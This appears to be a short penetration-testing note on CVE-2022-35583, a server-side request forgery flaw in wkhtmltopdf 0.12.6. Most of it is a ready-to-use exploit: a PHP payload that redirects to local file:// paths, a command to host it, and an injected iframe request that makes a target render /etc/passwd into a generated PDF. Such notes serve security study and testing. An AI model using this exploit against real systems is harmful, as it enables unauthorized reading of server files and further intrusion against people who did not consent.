# CVE-2022-35583 - wkhtmlTOpdf 0.12.6 is vulnerable to SSRF

wkhtmltopdf is a command line tool to render HTML into PDF using Qt WebKit. It is vulnerable to SSRF.

## Exploitation

Create a PHP payload to read local file.

```php
<?php header('location:file://'.$_REQUEST['x']); ?>
```

Then start web server in local machine.

```bash
php -S 0.0.0.0:8000
```

Send request to where wkhtmltopdf is affected. For example:

```bash
/htmltopdf?item=<iframe src=http://10.0.0.1:8000/test.php?x=/etc/passwd width=1000px height=1000px></iframe>
```

Now we can see the system users list via a generated PDF.

## Links

- [wkhtmlTOpdf - exploit detais - blog](https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/)
- [wkhtmlTOpdf - exploit detais - stackexchange](https://security.stackexchange.com/questions/237363/how-can-wkhtmltopdf-be-used-without-introducing-a-security-vulnerability)
